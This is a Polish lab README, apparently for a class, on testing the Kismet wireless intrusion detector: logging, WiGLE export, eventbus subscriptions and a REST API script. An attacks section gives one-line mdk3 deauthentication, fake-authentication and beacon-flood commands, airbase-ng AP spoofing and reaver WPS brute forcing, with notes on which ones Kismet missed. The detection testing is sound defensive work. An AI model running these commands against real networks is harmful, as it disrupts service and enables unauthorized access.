
# Kismet
Tak powinna wyglądać prezentacja gdyby udało mi sie podłączyć do monitora :)

## Start Kismet
```sh
kismet -c wlan0mon
```

## Viewing kismet logs
Logi domyślnie zapisują sie w formacie sqlite co pozawala na ich wygodne przeglądanie.
![](src/logging_conf.png)
***

```sh
sqlitebrowser <kismet_log>
```

![](src/sql1.png)
***

![](src/sql2.png)
***
## Export kismet logs to wigle
W celu wyeksportowania logów do portalu wigle należy najpierw skonwertować je do odpowiedniego formatu.
```sh
kismetdb_to_wiglecsv --in <kismet_log> --out <kismet_log.csv>
```
***

# Websocat

## Stworzenie gniazda
Gniazdo pozwala na otrzymywanie powiadomień w czasie rzeczywistym w przeciwieństwie do wewnętrznej magistrali komunikacyjnej messagebus.

```sh
websocat 'ws://<ip>:2501/eventbus/events.ws?user=admin&password=admin'
```
***

## Przykładowe subskrypcje eventbus
```
{"SUBSCRIBE": "TIMESTAMP"}

{"UNSUBSCRIBE": "TIMESTAMP"}

{"SUBSCRIBE": "ALERT"}

{"SUBSCRIBE": "MESSAGE"}

{"SUBSCRIBE": "DOT11_WPA_HANDSHAKE"}
```

## Sybskrypcja na alerty z wykorzystaniem gniazda Eventbus

![](src/websocat.png)
***

# Ataki

## Creating airmon interface
```sh
airmon-ng check kill
``` 

```sh
airmon-ng start wlan0 
```

## Check if airmon interface works
```sh
airodump-ng wlan0mon
```

## Install mdks
```sh
apt-get install mdk3
```

## Network scanning 
```sh
iw <interface_name> scan
```
```sh
wifite --showb
``` 
Alarm nie zostaje wykryty przez kismet (prawdopodobnie przez zbyt małą częstotliwość wysyłania probe request)

### Deauthentication
```sh
mdk3 <iface> d –c <ch>
```
![](src/deauth_flood.png)
***

### Fake authenitcation
```sh
mdk3 <iface> a –a <bssid>
```
Tutaj rowniez alarm nie jest wykrywany

### Beacon Flooding
```sh
mdk3 <iface> b -c <ch> -s 1000
```
W tym przypadku kismet ostrzega nas jedynie o znakach specjalnych zawartych w bssid
![](src/string_alert.png)
***

### Spoofing AP

```sh
airbase-ng -0 -c 1 -e <essid> -a <ssid> -I 1 wlan0mon
```
![](src/spoof.png)
***

### Breaking WPS
```sh
reaver -c <ch> -d 0 -b <bssid> -S -N -i <iface> -vv -g <n>
```
Tutaj również kismet teoretycznie powinien wykryć atak jednak nie udało nam się tego osiągnąć w warunkach laboratoryjnych. Poniżej alert który powinien sie pojawić.

>WPSBRUTE
>
>Trend/stateful
>
>Excessive WPS negotiations can indicate an attack against WPS, such as Reaver

# Kismet API

Prosty skrypt korzystający z biblioteki kismet_rest w python
Biblioteka ta śluzy do komunikacji z REST API który jest domyślnie zaimplementowany w Kismet. Informacje zwracane sa w formacie JSON.

```python
#! /usr/bin/env python3
# pip install kismet_rest
import kismet_rest
import json
import sys

host_uri="http://10.211.55.10:2501"
username="admin"
password="admin"
separator = 220
o = sys.argv[1]



def pretty_print(x):
    print(json.dumps(x, indent=2))
    print("*"*separator)

if o == 'all-ap' and len(sys.argv) == 2: 
    k_connect = kismet_rest.KismetConnector(host_uri=host_uri, username=username, password=password)
    for ap in k_connect.dot11_access_points():
        pretty_print(ap)

elif o == 'ap-clients' and len(sys.argv) == 3:
    k_connect = kismet_rest.KismetConnector(host_uri=host_uri, username=username, password=password)
    dk = k_connect.dot11_access_points()[int(sys.argv[2])]["kismet.device.base.key"]
    print(dk)
    pretty_print(k_connect.dot11_clients_of(dk))

elif o == 'version' and len(sys.argv) == 2:
    k_interface = kismet_rest.BaseInterface(host_uri=host_uri, username=username, password=password)
    pretty_print(k_interface.get_kismet_version())

elif o == 'sys-stat' and len(sys.argv) == 2:
    k_system = kismet_rest.System(host_uri=host_uri, username=username, password=password)
    pretty_print(k_system.get_status())

elif o == 'sys-time' and len(sys.argv) == 2:
    k_system = kismet_rest.System(host_uri=host_uri, username=username, password=password)
    pretty_print(k_system.get_system_time())

elif o == 'alerts-all' and len(sys.argv) == 2:
    k_alerts = kismet_rest.Alerts(host_uri=host_uri, username=username, password=password)
    for a in k_alerts.all():
        pretty_print(a)

elif o == 'alerts-def' and len(sys.argv) == 2:
    k_alerts = kismet_rest.Alerts(host_uri=host_uri, username=username, password=password)
    pretty_print(k_alerts.define())

elif o == 'gps' and len(sys.argv) == 2:
    k_gps = kismet_rest.GPS(host_uri=host_uri, username=username, password=password)
    pretty_print(k_gps.current_location())

elif o == 'src' and len(sys.argv) == 2:
    k_sources = kismet_rest.Datasources(host_uri=host_uri, username=username, password=password)
    for ds in k_sources.all():
        pretty_print(ds)

elif o == 'set-channel' and len(sys.argv) == 3:
    k_sources = kismet_rest.Datasources(host_uri=host_uri, username=username, password=password)
    for s in k_sources.all():
        k_sources.set_channel(s["kismet.datasource.uuid"], sys.argv[2])

elif o == 'set-hop' and len(sys.argv) == 2:
    k_sources = kismet_rest.Datasources(host_uri=host_uri, username=username, password=password)
    for s in k_sources.all():
        k_sources.set_hop(s["kismet.datasource.uuid"])

elif o == 'messages' and len(sys.argv) == 2:
    k_messages = kismet_rest.Messages(host_uri=host_uri, username=username, password=password)
    for m in k_messages.all():
        pretty_print(m)

else:
    raise Exception("Wrong Argument")
```

## Wyświetlanie alertów
![](src/api_alerts.png)
***

## Informacje GPS
![](src/api_gps.png)
***

## Lista wszystkich AP
![](src/all_ap.png)
***

## Lista urządzeń powiązanych z AP
![](src/ap_clients.png)
***

## Ustawianie kanału do nasłuchu
REST API pozwala również na konfigurowanie ustawień kismet
```sh
./kismet_api.py set-channel 44
```
